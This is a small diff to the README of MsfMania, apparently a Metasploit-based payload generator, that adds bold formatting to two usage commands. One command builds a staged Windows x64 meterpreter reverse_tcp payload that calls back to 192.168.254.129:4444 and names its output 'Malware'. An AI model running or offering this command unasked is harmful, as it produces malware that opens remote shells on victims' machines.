@@ -27,10 +27,10 @@ New features:
 
 ## Usage
 ```
-python3 MsfMania.py -h
+**python3 MsfMania.py -h**
 ```
 ```
-python3 MsfMania.py staged x64 windows/x64/meterpreter/reverse_tcp 192.168.254.129 4444 Malware local
+**python3 MsfMania.py staged x64 windows/x64/meterpreter/reverse_tcp 192.168.254.129 4444 Malware local**
 ```
 
 
